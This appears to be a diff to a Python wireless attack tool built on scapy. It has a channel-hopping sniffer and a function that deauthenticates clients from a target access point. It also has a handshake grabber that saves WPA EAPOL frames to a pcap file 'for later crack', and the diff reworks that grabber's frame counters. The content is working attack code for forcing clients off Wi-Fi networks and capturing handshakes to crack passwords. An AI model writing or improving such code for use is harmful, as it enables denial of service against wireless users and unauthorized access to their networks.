@@ -25,8 +25,8 @@ import string
 #Global variables and banner:
 ap_list = []
 cli_list = []
-to_frames = []
-from_frames = []
+to_frames = 0
+from_frames = 0
 ap_list_temp = []
 temp_cli_mac = None
 interface = ""
@@ -188,9 +188,7 @@ def packet_handler(packet):
             ap.print_ap()
 
     except Exception as e:
-        print("Error getting Access Point information : ")
-        print(e)
-
+        pass
 
 
 #The network sniffer simply hop between channels and sniff the wireless network around the user.
@@ -199,12 +197,10 @@ def network_sniffer():
     print("[INFO] Press Ctrl+c to stop the capture")
     signal.signal(signal.SIGINT,signal_handler2) #Handle the ctrl+c to not quit and return to main menu.
     while True:
-        sniff(iface=interface,prn=packet_handler,count=5)
+        sniff(iface=interface,prn=packet_handler,count=3)
         os.system("iw dev "+ interface + " set channel %d" % chans[i])
         i = (i + 1) % len(chans)
         time.sleep(1)
-
-
 #This function is going to deauth the clients on the specified AP
 def deauth(ap):
     time.sleep(3)
@@ -227,27 +223,20 @@ def deauth(ap):
 #It is saving the EAPOL paquet into a pcap file for later crack.
 #Return TRUE if the handshake was grabbed successfully.
 def checkForWPAHandshake(p):
+    global from_frames
+    global to_frames
     pktdump =  PcapWriter('./handshake/handshake.pcap',append=True,sync=True)
     if EAPOL in p:
         pktdump.write(p)
         to_ds = p.FCfield & TO_DS != 0 # Identify the direction of the message C->AP or AP->
         if to_ds:
-            client = p.addr2 #The client send EAPOL Frame
+            to_frames += 1 #AP -> CLI
+            print("AP -> CLI",to_frames)
         else:
-            client = p.addr1 #The AP send EAPOL Frame
-        if client not in cli_list:
-            cli_list.append(client)
-            print("New client identified : " + str(p.addr1) + "----HANDSHAKE--->" + str(p.addr2))
-            to_frames.append(0)
-            from_frames.append(0)
-
-        idx = cli_list.index(client)
-        if to_ds:
-            to_frames[idx] = to_frames[idx] + 1 #AP -> CLI
-        else:
-            from_frames[idx] = from_frames[idx] + 1 #CLI -> AP
+            from_frames += 1 #CLI -> AP
+            print("CLI -> AP",from_frames)
         # See if we captured 4 way handshake
-        if (to_frames[idx] == 2) and (from_frames[idx] == 2):
+        if (to_frames == 2) and (from_frames == 2):
             captured_handshake = True
             return True
 
@@ -288,6 +277,12 @@ def grab_handshake(ap):
 #It is asking the user to select the AP they want to sniff
 #Then triggers the grab_handshake function to start the capture
 def handshake_grabber():
+    #Reset handshake counter
+    global from_frames
+    global to_frames
+    from_frames = 0
+    to_frames = 0 
+
     signal.signal(signal.SIGINT, signal.SIG_DFL)
     if len(ap_list) == 0:
         print("There is no access point sniffed yet, please start the network sniffer first.")
